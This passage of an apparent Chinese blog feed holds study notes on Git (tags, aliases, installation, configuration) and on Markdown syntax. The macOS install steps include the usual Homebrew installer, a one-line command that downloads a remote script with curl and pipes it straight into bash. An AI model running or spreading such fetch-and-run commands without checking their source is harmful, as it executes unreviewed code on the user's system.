通常会建议使用<code>-a</code>创建附注标签，这样你可以拥有以上所有信息：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag -a v1.4 -m &quot;my version 1.4&quot;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="标签补打">标签补打</h3><ul><li><p>假设提交历史如下：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git <span class="built_in">log</span> --pretty=oneline</span></span><br><span class="line">9fceb02d0ae598e95dc970b74767f19372d61af8 updated rakefile</span><br></pre></td></tr></table></figure></li><li><p>假设在“updated rakefile” 提交时忘记给项目打标签，可以在之后补上标签。 要在哪一次提交上打标签，就需要在命令的末尾指定哪一次提交的校验和（或部分校验和）：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag -a v1.0 9fceb02</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="删除标签">删除标签</h3><ul><li><p>要删除掉本地仓库上的标签，可以使用命令 <code>git tag -d &lt;tagname&gt;</code>。 例如，可以使用以下命令删除一个轻量标签：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git tag -d v1.4</span></span><br><span class="line">Deleted tag &#x27;v1.4&#x27; (was e7d5add)</span><br></pre></td></tr></table></figure></li><li><p>上述命令并不会从任何远程仓库中移除这个标签，需要用 <code>git push</code> 来更新远程仓库：</p><ul><li><p><code>git push &lt;remote&gt; :refs/tags/&lt;tagname&gt;</code> ，这种操作的含义是，将冒号前面的空值推送到远程标签名，从而高效地删除它：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin :refs/tags/v1.4</span></span><br><span class="line">To /git@github.com:schacon/simplegit.git</span><br><span class="line"> - [deleted]         v1.4</span><br></pre></td></tr></table></figure></li><li><p>第二种更直观的删除远程标签的方式是：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git push origin --delete &lt;tagname&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="Git别名">Git别名</h2><ul><li><p>Git可以为命令设置自定义别名，通过<code>git config</code>来为命令设置别名，例如：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global alias.co checkout</span><br><span class="line">git config --global alias.ci commit</span><br><span class="line">git config --global alias.unstage &#x27;reset HEAD --&#x27;</span><br></pre></td></tr></table></figure></li><li><p>那么如果需要输入<code>git commit</code>时，就可以通过输入<code>git ci</code>替代</p><p>如果需要输入<code>git reset HEAD -- fileA</code>时，可以用<code>git unstage fileA</code>替代</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Git</title>
      <link href="/posts/189553d2.html"/>
      <url>/posts/189553d2.html</url>
      
        <content type="html"><![CDATA[<h2 id="版本控制是什么">版本控制是什么</h2><ul><li><p>版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。</p><blockquote><p>如果你是位图形或网页设计师，可能会需要保存某一幅图片或页面布局文件的所有修订版本（这或许是你非常渴望拥有的功能），采用版本控制系统（VCS）是个明智的选择。 有了它你就可以将选定的文件回溯到之前的状态，甚至将整个项目都回退到过去某个时间点的状态，你可以比较文件的变化细节，查出最后是谁修改了哪个地方，从而找出导致怪异问题出现的原因，又是谁在何时报告了某个功能缺陷等等。 使用版本控制系统通常还意味着，就算你乱来一气把整个项目中的文件改的改删的删，你也照样可以轻松恢复到原先的样子。 但额外增加的工作量却微乎其微。</p></blockquote></li></ul><h2 id="本地版本控制系统">本地版本控制系统</h2><ul><li>为了解决在工作中常常出现的写错文件或者意外覆盖不该覆盖的文件，人们很早就开发了许多本地版本控制系统，大多都是采用某种简单的数据库来记录文件的历次更新差异。但接下来又出现了新的问题，如何让在不同系统的不同开发者协同工作呢？</li></ul><h3 id="集中化的版本控制系统（CVCS）">集中化的版本控制系统（CVCS）</h3><ul><li><p>为了解决协同办公问题，集中化的版本控制系统诞生了，诸如CVS、SVN等，都有一个集中管理的服务器保存所有文件的修订版本。所有的代码都由中央仓库集中管理，每个开发者都使用同一个中央仓库进行开发，这样一来，每个人都可以看到其他人正在做些什么，而管理员也可以轻松地掌控每个开发者的权限，并且管理一个服务器也比管理各个客户端上的数据库更加轻松容易。但是，也有着一个显而易见的缺点，因为必须依靠网络连接来提交和获取代码，因此没有网络时则无法进行版本控制操作。如果服务器发生故障，那么这段时间里谁也无法更新提交，而若中心数据库的磁盘发生故障，而有没有做好备份，那么就会丢失所有数据。</p><p><img src="https://s1.vika.cn/space/2023/07/29/f17c8559b05d4332a9559859e64806bc" alt="centralized"></p></li></ul><h3 id="分布式版本控制系统（DVCS）">分布式版本控制系统（DVCS）</h3><ul><li><p>为了避免文件因为中心数据库的损坏而完全丢失的问题，分布式版本控制系统诞生了，客户端不只是提取最新版本的文件快照，而是把代码仓库完整地镜像下来，每个开发者都可以在本地拥有完整的代码仓库副本。这样一来，客户端可以在没有网络的情况下进行代码修改和版本控制，同时也避免了数据丢失的问题。</p><p><img src="https://s1.vika.cn/space/2023/07/29/16a1ceb2842248e88763ebd6718f52e4" alt="distributed"></p></li></ul><h2 id="Git是什么">Git是什么</h2><ul><li>Git和其他版本控制系统有着一定的差别，尽管有着相同的目的，实现方式却是截然不同的。</li></ul><h3 id="基于差异的版本控制">基于差异的版本控制</h3><ul><li><p>CVS、SVN等系统的你工作方式是基于变更集的，以文件变更列表的方式存储信息，每次提交只记录具有差异的内容，因此一组文件的存储信息则是每个文件随时间逐步积累的差异。</p><p><img src="https://s1.vika.cn/space/2023/07/29/4c7165c1287f497ebc197f833ee33dd9" alt="deltas"></p></li></ul><h3 id="基于快照的版本控制">基于快照的版本控制</h3><ul><li><p>与其他的版本控制系统不同的是，Git 更像是把数据看作是对小型文件系统的一系列快照。在Git中，每次提交更新或者保存项目状态时，就会对现在的全部文件创建一个快照并保存这个快照的索引，对于没有修改的文件，则是保留一个链接指向之前存储的文件。</p><p><img src="https://s1.vika.cn/space/2023/07/29/eb2c04f160cc4fc19875fc0074f79146" alt="snapshots"></p></li><li><p>在使用体验上，Git相较其他版本控制系统有着更好的性能，由于本地存储于快照机制，速度通常更快，同时Git也有着较为强大的分支处理机制，与较为复杂的SVN相比更加灵活与简便。</p></li></ul><h2 id="Git的安装">Git的安装</h2><div class="tabs" id="git的安装"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#git的安装-1">Windows</button></li><li class="tab"><button type="button" data-href="#git的安装-2">Mac</button></li><li class="tab"><button type="button" data-href="#git的安装-3">Linux/Unix</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="git的安装-1"><ol><li><p>进入<a href="https://git-scm.com/download/win">Git下载</a>页面，或者进入<a href="https://registry.npmmirror.com/binary.html?path=git-for-windows/">国内镜像源</a>，选择安装包文件下载</p></li><li><p>使用安装包安装Git</p></li><li><p>打开控制台（命令提示符），输入以下内容，若显示Git的版本号则安装成功</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="git的安装-2"><div class="tabs" id="mac下git的安装"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#mac下git的安装-1">方法一</button></li><li class="tab"><button type="button" data-href="#mac下git的安装-2">方法二</button></li><li class="tab"><button type="button" data-href="#mac下git的安装-3">方法三</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="mac下git的安装-1"><p><strong>使用Homebrew安装</strong></p><ol><li><p>打开终端应用程序（Terminal）</p></li><li><p>输入以下指令安装HomeBrew</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c &quot;$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)&quot;</span><br></pre></td></tr></table></figure></li><li><p>输入以下指令安装Git</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install git</span><br></pre></td></tr></table></figure></li><li><p>验证Git是否安装成功，若显示Git的版本号，则安装成功</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="mac下git的安装-2"><p><strong>使用Xcode Command Line Tools安装</strong></p><ol><li><p>打开终端应用程序（Terminal）</p></li><li><p>输入以下指令安装Xcode Command Line Tools</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xcode-select --install</span><br></pre></td></tr></table></figure></li><li><p>验证Git是否安装成功，若显示Git的版本号，则安装成功</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure></li></ol><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="mac下git的安装-3"><p><strong>作为GitHub for macOS的一部分来安装</strong></p><p>在安装软件时，提供了安装命令行工具的选项，可以从<a href="https://mac.github.com/">GitHub for macOS网站</a>下载该安装包。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="git的安装-3"><p><strong>Debian/Ubuntu 使用以下指令</strong></p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure><p><strong>CentOS 使用以下指令</strong></p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install git</span><br></pre></td></tr></table></figure><p>安装完成后，检查是否安装成功</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="运行Git前的配置">运行Git前的配置</h2><blockquote><p>Git 自带一个 <code>git config</code> 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：</p><ol><li><code>/etc/gitconfig</code> 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果在执行 <code>git config</code> 时带上 <code>--system</code> 选项，那么它就会读写该文件中的配置变量。 （由于它是系统配置文件，因此你需要管理员或超级用户权限来修改它。）</li><li><code>~/.gitconfig</code> 或 <code>~/.config/git/config</code> 文件：只针对当前用户。 你可以传递 <code>--global</code> 选项让 Git 读写此文件，这会对你系统上 <strong>所有</strong> 的仓库生效。</li><li>当前使用仓库的 Git 目录中的 <code>config</code> 文件（即 <code>.git/config</code>）：针对该仓库。 你可以传递 <code>--local</code> 选项让 Git 强制读写此文件，虽然默认情况下用的就是它。。 （当然，你需要进入某个 Git 仓库中才能让该选项生效。）</li></ol><p>每一个级别会覆盖上一级别的配置，所以 <code>.git/config</code> 的配置变量会覆盖 <code>/etc/gitconfig</code> 中的配置变量。</p><p>在 Windows 系统中，Git 会查找 <code>$HOME</code> 目录下（一般情况下是 <code>C:\Users\$USER</code> ）的 <code>.gitconfig</code> 文件。 Git 同样也会寻找 <code>/etc/gitconfig</code> 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。 如果你在 Windows 上使用 Git 2.x 以后的版本，那么还有一个系统级的配置文件，Windows XP 上在 <code>C:\Documents and Settings\All Users\Application Data\Git\config</code> ，Windows Vista 及其以后的版本在 <code>C:\ProgramData\Git\config</code> 。此文件只能以管理员权限通过 <code>git config -f &lt;file&gt;</code> 来修改。</p><p>你可以通过以下命令查看所有的配置以及它们所在的文件：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list --show-origin</span><br></pre></td></tr></table></figure></blockquote><ul><li>配置Git的相关内容通常使用的是Git Bash，可以在windows菜单中找到，或者在任意目录下右击鼠标，选择<code>Open Git Bash here</code>打开。如果配置好了Git的环境变量，那么也可以直接在命令行中输入（判断是否可用最简单的办法是在命令行中输入<code>git --version</code>查看是否显示版本号）。</li></ul><h3 id="用户信息">用户信息</h3><ul><li><p>安装完 Git 之后，要做的第一件事就是设置你的用户名和邮件地址。 这一点很重要，因为每一个 Git 提交都会使用这些信息，它们会写入到你的每一次提交中。</p></li><li><p>输入以下内容配置Git的用户名和电子邮件地址。如果使用了 <code>--global</code> 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 <code>--global</code> 选项的命令来配置。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;你的用户名&quot;</span><br><span class="line">git config --global user.email 你的邮箱</span><br></pre></td></tr></table></figure></li></ul><h3 id="文本编辑器">文本编辑器</h3><ul><li><p>当 Git 需要输入信息时会调用文本编辑器。 如果未配置，Git 会使用操作系统默认的文本编辑器。在 Windows 系统上，如果你想要使用别的文本编辑器，那么必须指定可执行文件的完整路径，它可能随你的编辑器的打包方式而不同。如果你想使用不同的文本编辑器，例如 Emacs，可以这样做：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global core.editor emacs</span><br></pre></td></tr></table></figure><blockquote><p>对于 Notepad++，一个流行的代码编辑器来说，你可能想要使用 32 位的版本， 因为在本书编写时 64 位的版本尚不支持所有的插件。 如果你在使用 32 位的 Windows 系统，或在 64 位系统上使用 64 位的编辑器，那么你需要输入如下命令：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">git config --global core.editor <span class="string">&quot;&#x27;C:/Program Files/Notepad++/notepad++.exe&#x27; -multiInst -notabbar -nosession -noPlugin&quot;</span></span></span><br></pre></td></tr></table></figure></blockquote></li></ul><h3 id="查看配置信息">查看配置信息</h3><ul><li><p>需要检查已有的配置信息时，可以使用如下命令。有时会看到重复的变量名，分别来自不同的配置文件，最终Git实际使用的是最后一条。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --list</span><br></pre></td></tr></table></figure></li><li><p>也可以直接查阅某个环境变量的设定值，例如使用下面的命令查询配置的用户名和邮箱。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure></li></ul><h2 id="获取帮助">获取帮助</h2><ul><li><p>如果需要获取Git指令的帮助，可以使用如下三种指令：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git help &lt;verb&gt;</span><br><span class="line">git &lt;verb&gt; --help</span><br><span class="line">man git-&lt;verb&gt;</span><br></pre></td></tr></table></figure></li><li><p>例如，想要查看<code>git config</code>的手册，可以输入：</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git help config</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown的扩展语法</title>
      <link href="/posts/1a959ff5.html"/>
      <url>/posts/1a959ff5.html</url>
      
        <content type="html"><![CDATA[<h2 id="表格">表格</h2><p>要添加表格，需要使用三个或多个连字符“<code>---</code>”创建每列的标题，并使用竖线符号分隔每列。即使每一行的竖线分隔并未对齐，Markdown编辑器也可以成功创建表格。但通过以上方法创建表格较为麻烦，大部分的Markdown编辑器都有快速创建表格的方式。同时，可以在连字符的左侧、右侧或者两端添加冒号“<code>:</code>”使该列应用不同的对齐方式。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| Syntax | Description | Test Text |</span><br><span class="line">| :--- | :----: | ---: |</span><br><span class="line">| Header | Title | Here&#x27;s this |</span><br><span class="line">| Paragraph | Text | And more |</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><table><thead><tr><th style="text-align:left">Syntax</th><th style="text-align:center">Description</th><th style="text-align:right">Test Text</th></tr></thead><tbody><tr><td style="text-align:left">Header</td><td style="text-align:center">Title</td><td style="text-align:right">Here’s this</td></tr><tr><td style="text-align:left">Paragraph</td><td style="text-align:center">Text</td><td style="text-align:right">And more</td></tr></tbody></table><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>在表格中，标题、块引用、列表、水平规则、图像或HTML标签并不会被渲染成对应样式，但可以在表格中添加链接、代码（通过反引号包裹）和强调。如果需要在表格中展示竖线符号，需要使用其对应的实体代码，参考<a href="/posts/2023-07/81d4d2a5.html#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84%E8%BD%AC%E4%B9%89">特殊字符的转义</a></p><h2 id="脚注">脚注</h2><p>为文本添加脚注后，可以在标识符处查看脚注的内容。在对应文本处添加方括号包围的标识符（<code>[^1]</code>），标识符可以是数字或者字符，但不能包含空格及制表符。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Here&#x27;s a simple footnote[^1], and here&#x27;s a longer one[^bignote].</span><br><span class="line"></span><br><span class="line">[<span class="symbol">^1</span>]: <span class="link">This is the first footnote.</span></span><br><span class="line"></span><br><span class="line">[<span class="symbol">^bignote</span>]: <span class="link">Here&#x27;s one with multiple paragraphs and code.</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><img src="https://s1.vika.cn/space/2023/07/19/7a4f0057bfdd430e997c6b50f7109d06" alt="2023719-15526-HD 00_00_00-00_00_03"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="删除线">删除线</h2><p>分别使用两个波浪线符号“<code>~</code>”包裹内容可以在内容上放置一条水平线。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~~世界是平坦的。~~ 我们现在知道世界是圆的。</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><s>世界是平坦的。</s> 我们现在知道世界是圆的。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="任务列表">任务列表</h2><p>在支持任务列表的Markdown应用程序中，复选框将显示在内容旁边。要创建任务列表，请在任务列表项之前添加破折号<code>-</code>和方括号<code>[ ]</code>，并在<code>[ ]</code>前面加上空格。要选择一个复选框，请在方括号<code>[x]</code>之间添加 x 。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> [x] Write the press release</span><br><span class="line"><span class="bullet">-</span> [ ] Update the website</span><br><span class="line"><span class="bullet">-</span> [ ] Contact the media</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><ul><li>[x] Write the press release</li><li>[ ] Update the website</li><li>[ ] Contact the media</li></ul><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="Emoji表情">Emoji表情</h2><p>有两种方法可以将表情符号添加到Markdown文件中：将表情符号复制并粘贴到Markdown格式的文本中，或者键入简码（<em>emoji shortcodes</em>）。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">去露营了！ :tent: 很快回来。</span><br><span class="line"></span><br><span class="line">真好笑！ :joy:</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>去露营了！ ⛺ 很快回来。</p><p>真好笑！ 😂</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="自动网址链接">自动网址链接</h2><p>许多Markdown处理器会自动将URL转换为链接。这意味着如果输入http://www.example.com，即使未<a href="https://markdown.com.cn/basic-syntax/links.html">使用方括号</a>，Markdown处理器也会自动将其转换为链接。而如果不希望自动链接，则可以通过反引号包裹来删除链接。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com</span><br><span class="line"><span class="code">`http://www.example.com`</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><a href="http://www.example.com">http://www.example.com</a><br><code>http://www.example.com</code></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="标题链接">标题链接</h2><p>通过创建带有井号“<code>#</code>”和自定义标题ID的<code>[Heading ID](#title)</code>，可以链接到文档中对应的标题。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">标题链接</span>](<span class="link">#标题链接</span>)</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><a href="/posts/2023-07/1a959ff5.html#%E6%A0%87%E9%A2%98%E9%93%BE%E6%8E%A5">标题链接</a></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown的基本语法</title>
      <link href="/posts/81d4d2a5.html"/>
      <url>/posts/81d4d2a5.html</url>
      
        <content type="html"><![CDATA[<h2 id="标题">标题</h2><p>在标题文字之前添加“<code>#</code>”，井号的数量对应着标题的等级，从1到6为从大到小，依次对应HTML中的标签 <code>&lt;h1&gt;</code>到 <code>&lt;h6&gt;</code>。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># Heading level 1</span></span><br><span class="line"><span class="section">## Heading level 2</span></span><br><span class="line"><span class="section">### Heading level 3</span></span><br><span class="line"><span class="section">#### Heading level 4</span></span><br><span class="line"><span class="section">##### Heading level 5</span></span><br><span class="line"><span class="section">###### Heading level 6</span></span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>效果请见文章内的标题。</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="段落">段落</h2><p>Markdown使用空白行将文本分为两个段落，对应HTML的 <code>&lt;p&gt;</code>标签。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">I really like using Markdown.</span><br><span class="line"></span><br><span class="line">I think I&#x27;ll use it to format all of my documents from now on.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>I really like using Markdown.</p><p>I think I’ll use it to format all of my documents from now on.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="换行">换行</h2><p>在一行文本的末尾添加两个以上空格并回车，对应HTML中的 <code>&lt;br&gt;</code>标签</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">This is the first line.  </span><br><span class="line">And this is the second line.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p>This is the first line.<br>And this is the second line.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h2 id="强调">强调</h2><h3 id="粗体（Bold）">粗体（Bold）</h3><p>在需要强调的文本前后添加两个星号“<code>**</code>”或者下划线“<code>__</code>”，对应HTML中的 <code>&lt;strong&gt;</code>标签。</p><div class="tabs" id="分栏"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#分栏-1">示例代码</button></li><li class="tab"><button type="button" data-href="#分栏-2">渲染演示</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="分栏-1"><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="strong">**Bold text**</span> with asterisks.</span><br><span class="line"><span class="strong">__Bold text__</span> with underscores.</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="分栏-2"><p><strong>Bold text</strong> with 